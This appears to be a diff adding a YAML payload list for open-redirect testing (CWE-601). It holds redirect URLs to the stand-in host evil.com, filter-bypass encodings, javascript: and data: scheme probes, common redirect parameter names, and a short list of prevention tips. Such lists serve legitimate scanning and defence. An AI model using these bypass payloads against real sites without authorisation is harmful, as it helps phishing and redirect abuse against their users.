@@ -1,0 +1,93 @@
+# Miscellaneous - Open Redirect Payloads
+# CWE-601: URL Redirection to Untrusted Site
+
+payload_category: "open-redirect"
+owasp_2025: "A01"
+cwe: "CWE-601"
+severity: "MEDIUM"
+
+# ===== BASIC REDIRECT =====
+basic:
+  absolute_url:
+    - "https://evil.com"
+    - "http://evil.com"
+    - "//evil.com"
+    - "///evil.com"
+    - "////evil.com"
+
+  protocol_relative:
+    - "//evil.com"
+    - "///evil.com"
+    - "\\/\\/evil.com"
+    - "/\\/evil.com"
+
+# ===== FILTER BYPASS =====
+filter_bypass:
+  domain_confusion:
+    - "https://evil.com@legitimate.com"
+    - "https://legitimate.com.evil.com"
+    - "https://legitimate.com%40evil.com"
+    - "https://evil.com#legitimate.com"
+    - "https://evil.com?legitimate.com"
+    - "https://evil.com\\legitimate.com"
+
+  url_encoding:
+    - "https:%2F%2Fevil.com"
+    - "https:%252F%252Fevil.com"
+    - "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"
+    - "//evil%2Ecom"
+
+  backslash:
+    - "https://evil.com\\"
+    - "/\\evil.com"
+    - "\\.evil.com"
+
+  protocol_bypass:
+    - "javascript:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+    - "vbscript:msgbox(1)"
+    - "java\tscript:alert(1)"
+    - "jAvAsCrIpT:alert(1)"
+
+  null_byte:
+    - "https://evil.com%00legitimate.com"
+    - "//evil.com%00@legitimate.com"
+
+  special_characters:
+    - "https://evil.com%0d%0a"
+    - "//evil。com"
+    - "//evil%E3%80%82com"
+    - "////evil.com"
+    - "https:evil.com"
+
+# ===== PARAMETER NAMES =====
+common_parameters:
+  - "?redirect=https://evil.com"
+  - "?url=https://evil.com"
+  - "?next=https://evil.com"
+  - "?return=https://evil.com"
+  - "?returnUrl=https://evil.com"
+  - "?redirect_uri=https://evil.com"
+  - "?continue=https://evil.com"
+  - "?dest=https://evil.com"
+  - "?destination=https://evil.com"
+  - "?go=https://evil.com"
+  - "?target=https://evil.com"
+  - "?rurl=https://evil.com"
+  - "?forward=https://evil.com"
+  - "?out=https://evil.com"
+  - "?view=https://evil.com"
+  - "?login?to=https://evil.com"
+
+prevention:
+  - "Whitelist allowed redirect domains"
+  - "Use relative redirects only"
+  - "Validate URL scheme (http/https only)"
+  - "Don't use user input for redirects"
+  - "Use indirect references (map IDs to URLs)"
+
+references:
+  - "OWASP Top 10:2025 A01"
+  - "CWE-601: Open Redirect"
+  - "PayloadsAllTheThings: Open Redirect"
+  - "HackTricks: Open Redirect"
